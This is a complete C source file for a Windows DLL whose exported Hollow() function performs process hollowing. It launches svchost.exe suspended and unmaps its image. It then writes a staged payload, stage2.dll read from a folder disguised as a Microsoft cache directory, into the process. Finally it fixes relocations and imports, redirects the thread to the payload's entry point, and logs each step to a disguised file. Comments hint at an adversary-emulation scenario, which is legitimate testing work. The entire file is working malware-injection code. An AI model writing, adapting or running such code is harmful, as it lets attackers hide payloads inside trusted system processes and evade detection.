#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>

#define LOG_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\cache.dat"
#define STAGE2_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\stage2.dll"

typedef struct _PEB *PPEB;
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);

static void LogMessage(LPCWSTR msg) {
    HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t ts[64];
    wsprintfW(ts, L"[%04d-%02d-%02d %02d:%02d:%02d] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    char ts8[80], msg8[1024];
    WideCharToMultiByte(CP_UTF8, 0, ts, -1, ts8, sizeof(ts8), NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, msg, -1, msg8, sizeof(msg8), NULL, NULL);
    DWORD written;
    WriteFile(hFile, ts8, lstrlenA(ts8), &written, NULL);
    WriteFile(hFile, msg8, lstrlenA(msg8), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);
    CloseHandle(hFile);
}

static DWORD FindSvchostPID(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"svchost.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// Map an RVA in the image to a raw file offset in localBuf.
// Required: MinGW section VMA != PointerToRawData (e.g. .idata RVA 0x10000,
// file off 0xa600). Reading localBuf+rva would walk off the buffer and crash.
static DWORD RvaToFileOffset(PIMAGE_NT_HEADERS ntH, DWORD rva) {
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntH);
    for (WORD i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
        DWORD va = sec[i].VirtualAddress;
        DWORD vsz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (rva >= va && rva < va + vsz) return sec[i].PointerToRawData + (rva - va);
    }
    return rva;
}

// Apply PE relocations from the .reloc section to the remote process.
// delta = remoteImage - targetBase. Required when the image is loaded at a
// different base than its preferred one. Skips if the .reloc section is empty
// (image must then be loaded at the preferred base).
static BOOL ApplyRelocations(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS ntH, LPBYTE localBuf, DWORD_PTR delta) {
    PIMAGE_DATA_DIRECTORY relocDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir->Size == 0) return TRUE;

    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(localBuf + RvaToFileOffset(ntH, relocDir->VirtualAddress));
    DWORD offset = 0;
    while (offset < relocDir->Size) {
        if (reloc->SizeOfBlock == 0) break;
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* list = (WORD*)(reloc + 1);
        for (DWORD i = 0; i < count; i++) {
            int type = list[i] >> 12;
            int relOff = list[i] & 0xFFF;
            LPVOID patchAddr = (LPBYTE)remoteImage + reloc->VirtualAddress + relOff;
            if (type == IMAGE_REL_BASED_DIR64) {
                DWORD_PTR val = 0;
                if (!ReadProcessMemory(hProc, patchAddr, &val, sizeof(val), NULL)) return FALSE;
                val += delta;
                if (!WriteProcessMemory(hProc, patchAddr, &val, sizeof(val), NULL)) return FALSE;
            }
            // IMAGE_REL_BASED_HIGHLOW is x86-only; on x64 we only see DIR64.
        }
        offset += reloc->SizeOfBlock;
        reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
    }
    return TRUE;
}

// Find a DLL's base in the remote process by walking PEB->Ldr->InMemoryOrderModuleList.
// PEB.Ldr is at offset 0x18 on x64; PEB_LDR_DATA.InMemoryOrderModuleList head is
// at offset 0x20. LDR_DATA_TABLE_ENTRY layout on x64:
//   0x00 InLoadOrderLinks  0x10 InMemoryOrderLinks  0x20 InInitializationOrderLinks
//   0x30 DllBase  0x38 EntryPoint  0x40 SizeOfImage  0x48 FullDllName  0x58 BaseDllName
// InMemoryOrderLinks.LDR offsets: Length 0x58, MaxLength 0x5A, Buffer 0x60.
static LPVOID FindRemoteDllBase(HANDLE hProc, LPVOID remotePeb, const wchar_t* dllName) {
    LPVOID ldrAddr = NULL;
    if (!ReadProcessMemory(hProc, (LPBYTE)remotePeb + 0x18, &ldrAddr, sizeof(ldrAddr), NULL) || !ldrAddr) return NULL;

    LPVOID head = (LPBYTE)ldrAddr + 0x20;
    LPVOID entryLE = NULL;
    if (!ReadProcessMemory(hProc, head, &entryLE, sizeof(entryLE), NULL)) return NULL;

    int maxIter = 512;
    while (entryLE != head && maxIter-- > 0) {
        LPBYTE ldrEntry = (LPBYTE)entryLE - 0x10;

        LPVOID dllBase = NULL;
        USHORT nameLen = 0;
        PWSTR nameBuf = NULL;
        ReadProcessMemory(hProc, ldrEntry + 0x30, &dllBase, sizeof(dllBase), NULL);
        ReadProcessMemory(hProc, ldrEntry + 0x58, &nameLen, sizeof(nameLen), NULL);
        ReadProcessMemory(hProc, ldrEntry + 0x60, &nameBuf, sizeof(nameBuf), NULL);

        if (nameBuf && nameLen > 0 && nameLen < 512) {
            wchar_t name[256];
            ReadProcessMemory(hProc, nameBuf, name, nameLen, NULL);
            name[nameLen / sizeof(wchar_t)] = 0;
            if (_wcsicmp(name, dllName) == 0) return dllBase;
        }

        if (!ReadProcessMemory(hProc, entryLE, &entryLE, sizeof(entryLE), NULL)) return NULL;
    }
    return NULL;
}

// Load a DLL into the remote process when the suspended-and-hollowed svchost
// doesn't have it mapped (only ntdll/kernel32/kernelbase are present after
// CreateProcess(CREATE_SUSPENDED) — the loader hasn't run yet).
// Uses CreateRemoteThread + kernel32!LoadLibraryW, then re-scans the PEB.
// kernel32 is shared across processes at the same base (per-boot ASLR), so
// LoadLibraryW's address is valid in the target host.
static LPVOID LoadLibraryInRemote(HANDLE hProc, const wchar_t* dllName, LPVOID remotePeb) {
    LPVOID base = FindRemoteDllBase(hProc, remotePeb, dllName);
    if (base) return base;

    size_t nameSize = (lstrlenW(dllName) + 1) * sizeof(wchar_t);
    LPVOID remoteName = VirtualAllocEx(hProc, NULL, nameSize, MEM_COMMIT, PAGE_READWRITE);
    if (!remoteName) return NULL;
    SIZE_T written = 0;
    WriteProcessMemory(hProc, remoteName, dllName, nameSize, &written);

    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
    LPTHREAD_START_ROUTINE pLoad = (LPTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryW");

    LPVOID result = NULL;
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoad, remoteName, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        DWORD ret = 0;
        GetExitCodeThread(hThread, &ret);
        CloseHandle(hThread);
        result = FindRemoteDllBase(hProc, remotePeb, dllName);
        if (!result && ret) result = (LPVOID)(ULONG_PTR)ret;
    }
    VirtualFreeEx(hProc, remoteName, 0, MEM_RELEASE);
    return result;
}

// Find an exported function by name in a remote DLL.
// Returns NULL if the export is forwarded (a known limitation — forwarded
// exports need the forwarder DLL to be loaded and re-resolved, not in scope).
static LPVOID FindExportByName(HANDLE hProc, LPVOID dllBase, const char* funcName) {
    IMAGE_DOS_HEADER dosH;
    if (!ReadProcessMemory(hProc, dllBase, &dosH, sizeof(dosH), NULL)) return NULL;
    if (dosH.e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS ntH;
    if (!ReadProcessMemory(hProc, (LPBYTE)dllBase + dosH.e_lfanew, &ntH, sizeof(ntH), NULL)) return NULL;
    if (ntH.Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY exportDir = ntH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return NULL;

    IMAGE_EXPORT_DIRECTORY expDir;
    if (!ReadProcessMemory(hProc, (LPBYTE)dllBase + exportDir.VirtualAddress, &expDir, sizeof(expDir), NULL)) return NULL;
    if (expDir.NumberOfNames == 0 || expDir.NumberOfFunctions == 0) return NULL;

    DWORD nNames = expDir.NumberOfNames;
    DWORD nFuncs = expDir.NumberOfFunctions;

    DWORD* names = (DWORD*)LocalAlloc(LPTR, nNames * sizeof(DWORD));
    WORD* ordinals = (WORD*)LocalAlloc(LPTR, nNames * sizeof(WORD));
    DWORD* funcs = (DWORD*)LocalAlloc(LPTR, nFuncs * sizeof(DWORD));
    if (!names || !ordinals || !funcs) {
        if (names) LocalFree(names);
        if (ordinals) LocalFree(ordinals);
        if (funcs) LocalFree(funcs);
        return NULL;
    }

    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfNames, names, nNames * sizeof(DWORD), NULL);
    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfNameOrdinals, ordinals, nNames * sizeof(WORD), NULL);
    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfFunctions, funcs, nFuncs * sizeof(DWORD), NULL);

    LPVOID result = NULL;
    for (DWORD i = 0; i < nNames; i++) {
        char nameBuf[256] = {0};
        ReadProcessMemory(hProc, (LPBYTE)dllBase + names[i], nameBuf, sizeof(nameBuf) - 1, NULL);
        nameBuf[sizeof(nameBuf) - 1] = 0;
        if (lstrcmpA(nameBuf, funcName) == 0) {
            WORD ord = ordinals[i];
            if (ord < nFuncs) {
                DWORD funcRva = funcs[ord];
                if (funcRva >= exportDir.VirtualAddress && funcRva < exportDir.VirtualAddress + exportDir.Size) {
                    break;  // forwarded — bail
                }
                result = (LPBYTE)dllBase + funcRva;
            }
            break;
        }
    }

    LocalFree(names);
    LocalFree(ordinals);
    LocalFree(funcs);
    return result;
}

// Walk stage2's import table. For each DLL referenced, find the matching
// remote DLL base (must already be loaded in the target process) and resolve
// every imported function by name, writing the address to the remote IAT.
// Ordinal imports are flagged and rejected (not used in this scenario).
static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS ntH, LPBYTE localBuf, LPVOID remotePeb) {
    PIMAGE_DATA_DIRECTORY importDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size == 0) { LogMessage(L"[*] no import directory"); return TRUE; }

    PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(localBuf + RvaToFileOffset(ntH, importDir->VirtualAddress));
    int dllCount = 0, funcCount = 0;
    for (; import->Name; import++) {
        const char* dllNameA = (const char*)(localBuf + RvaToFileOffset(ntH, import->Name));
        wchar_t dllName[256];
        MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, dllName, 256);
        dllCount++;

        wchar_t dbg[256];
        wsprintfW(dbg, L"[*] IAT: resolving DLL %d: %s", dllCount, dllName);
        LogMessage(dbg);

        LPVOID remoteDllBase = FindRemoteDllBase(hProc, remotePeb, dllName);
        if (!remoteDllBase) {
            // Suspended-and-hollowed svchost only has ntdll/kernel32/kernelbase
            // mapped; the loader hasn't run. Inject the missing DLL by spawning
            // a remote thread that calls kernel32!LoadLibraryW, then re-scan PEB.
            wsprintfW(dbg, L"[*] IAT: %s not mapped — loading via remote thread", dllName);
            LogMessage(dbg);
            remoteDllBase = LoadLibraryInRemote(hProc, dllName, remotePeb);
            if (!remoteDllBase) {
                wchar_t buf[256];
                wsprintfW(buf, L"[-] IAT: failed to load %s into remote process", dllName);
                LogMessage(buf);
                return FALSE;
            }
            wsprintfW(dbg, L"[+] IAT: %s loaded at %p", dllName, remoteDllBase);
            LogMessage(dbg);
        } else {
            wsprintfW(dbg, L"[+] IAT: %s found at %p", dllName, remoteDllBase);
            LogMessage(dbg);
        }

        // ILT (OriginalFirstThunk) may be 0 in some PEs; fall back to IAT (FirstThunk).
        DWORD oltRva = import->OriginalFirstThunk ? import->OriginalFirstThunk : import->FirstThunk;
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(localBuf + RvaToFileOffset(ntH, oltRva));
        LPBYTE remoteIat = (LPBYTE)remoteImage + import->FirstThunk;
        for (; thunk->u1.AddressOfData; thunk++, remoteIat += sizeof(PVOID)) {
            LPVOID funcAddr = NULL;
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                wchar_t buf[256];
                wsprintfW(buf, L"[-] IAT: ordinal import not supported: %s!%lu", dllName, (thunk->u1.Ordinal & 0xFFFF));
                LogMessage(buf);
                return FALSE;
            }
            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(localBuf + RvaToFileOffset(ntH, thunk->u1.AddressOfData));
            funcAddr = FindExportByName(hProc, remoteDllBase, (const char*)ibn->Name);
            if (!funcAddr) {
                wchar_t buf[256];
                wsprintfW(buf, L"[-] IAT: export not found: %s!%s", dllName, ibn->Name);
                LogMessage(buf);
                return FALSE;
            }
            if (!WriteProcessMemory(hProc, remoteIat, &funcAddr, sizeof(PVOID), NULL)) {
                wchar_t buf[256];
                wsprintfW(buf, L"[-] IAT: WriteProcessMemory failed for %s!%s", dllName, ibn->Name);
                LogMessage(buf);
                return FALSE;
            }
            funcCount++;
        }
    }
    {
        wchar_t dbg[256];
        wsprintfW(dbg, L"[*] IAT: resolved %d functions across %d DLLs", funcCount, dllCount);
        LogMessage(dbg);
    }
    return TRUE;
}

__declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow) {
    LogMessage(L"[*] Hollow() started — T1055.012 process hollowing");

    wchar_t svchostPath[MAX_PATH] = {0};
    DWORD pid = FindSvchostPID();
    if (!pid) {
        lstrcpyW(svchostPath, L"C:\\Windows\\System32\\svchost.exe");
    } else {
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProc) {
            GetModuleFileNameExW(hProc, NULL, svchostPath, MAX_PATH);
            CloseHandle(hProc);
        }
        if (!svchostPath[0])
            lstrcpyW(svchostPath, L"C:\\Windows\\System32\\svchost.exe");
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(svchostPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        LogMessage(L"[-] CreateProcess (suspended) failed");
        return;
    }
    LogMessage(L"[+] svchost.exe created suspended");

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    PNtUnmapViewOfSection pNtUnmap = (PNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NTSTATUS (NTAPI *pNtQueryInfo)(HANDLE, int, PVOID, ULONG, PULONG) =
        (void*)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!pNtUnmap || !pNtQueryInfo) {
        LogMessage(L"[-] ntdll function not found");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG retLen = 0;
    if (pNtQueryInfo(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen) != 0) {
        LogMessage(L"[-] NtQueryInformationProcess failed");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }

    BYTE pebBuf[sizeof(PVOID) * 4] = {0};
    if (!ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + sizeof(PVOID) * 2, pebBuf, sizeof(PVOID), NULL)) {
        LogMessage(L"[-] ReadProcessMemory PEB failed");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    LPVOID imageBase;
    memcpy(&imageBase, pebBuf, sizeof(PVOID));

    HANDLE hFile = CreateFileW(STAGE2_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LogMessage(L"[-] stage2.dll not found at staging path");
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPBYTE stage2Buf = (LPBYTE)LocalAlloc(LPTR, fileSize);
    if (!stage2Buf) { CloseHandle(hFile); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }
    DWORD readBytes = 0;
    ReadFile(hFile, stage2Buf, fileSize, &readBytes, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER dosH = (PIMAGE_DOS_HEADER)stage2Buf;
    PIMAGE_NT_HEADERS ntH = (PIMAGE_NT_HEADERS)(stage2Buf + dosH->e_lfanew);
    DWORD imageSize = ntH->OptionalHeader.SizeOfImage;
    LPVOID targetBase = (LPVOID)ntH->OptionalHeader.ImageBase;

    pNtUnmap(pi.hProcess, imageBase);

    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, targetBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        LogMessage(L"[-] VirtualAllocEx at preferred base failed — trying any address");
        remoteImage = VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteImage) {
            LogMessage(L"[-] VirtualAllocEx (any addr) also failed");
            LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
            return;
        }
    }

    WriteProcessMemory(pi.hProcess, remoteImage, stage2Buf, ntH->OptionalHeader.SizeOfHeaders, NULL);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntH);
    for (WORD i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData) {
            WriteProcessMemory(pi.hProcess, (BYTE*)remoteImage + section[i].VirtualAddress,
                               stage2Buf + section[i].PointerToRawData, section[i].SizeOfRawData, NULL);
        }
    }
    LogMessage(L"[+] stage2.dll written to svchost memory");

    {
        wchar_t dbg[256];
        DWORD_PTR _delta = (DWORD_PTR)remoteImage - (DWORD_PTR)targetBase;
        wsprintfW(dbg, L"[*] delta=0x%Ix, remoteImage=%p, targetBase=%p, imageSize=%lu", _delta, remoteImage, targetBase, imageSize);
        LogMessage(dbg);
    }

    DWORD_PTR delta = (DWORD_PTR)remoteImage - (DWORD_PTR)targetBase;
    if (delta != 0) {
        LogMessage(L"[*] calling ApplyRelocations");
        if (!ApplyRelocations(pi.hProcess, remoteImage, ntH, stage2Buf, delta)) {
            LogMessage(L"[-] ApplyRelocations failed");
            LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
            return;
        }
        LogMessage(L"[+] Relocations applied (delta != 0)");
    } else {
        LogMessage(L"[*] delta==0, skipping ApplyRelocations");
    }

    if (remoteImage != targetBase) {
        LogMessage(L"[*] updating PEB image base");
        WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + sizeof(PVOID) * 2, &remoteImage, sizeof(PVOID), NULL);
    } else {
        LogMessage(L"[*] remoteImage==targetBase, skipping PEB update");
    }

    LogMessage(L"[*] calling ResolveImports");
    if (!ResolveImports(pi.hProcess, remoteImage, ntH, stage2Buf, pbi.PebBaseAddress)) {
        LogMessage(L"[-] IAT resolution failed");
        LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    LogMessage(L"[+] IAT resolved");

    LogMessage(L"[*] calling GetThreadContext");
    CONTEXT ctx = { CONTEXT_FULL };
    if (!GetThreadContext(pi.hThread, &ctx)) {
        LogMessage(L"[-] GetThreadContext failed");
        LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    // stage2.dll entry is DllMain(HINSTANCE, DWORD, LPVOID) -> Rcx, Rdx, R8.
    // Rip redirected to entry; fdwReason must be DLL_PROCESS_ATTACH (1) or
    // DllMain's guard never runs and stage2 produces no artifacts.
    ctx.Rcx = (DWORD64)remoteImage;
    ctx.Rdx = (DWORD64)DLL_PROCESS_ATTACH;
    ctx.R8  = (DWORD64)0;
    ctx.Rip = (DWORD64)remoteImage + ntH->OptionalHeader.AddressOfEntryPoint;
    LogMessage(L"[*] calling SetThreadContext");
    if (!SetThreadContext(pi.hThread, &ctx)) {
        LogMessage(L"[-] SetThreadContext failed");
        LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }
    LogMessage(L"[+] Thread context set — entry point redirected");

    ResumeThread(pi.hThread);
    LogMessage(L"[+] Hollow() complete — svchost.exe running stage2");

    LocalFree(stage2Buf);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
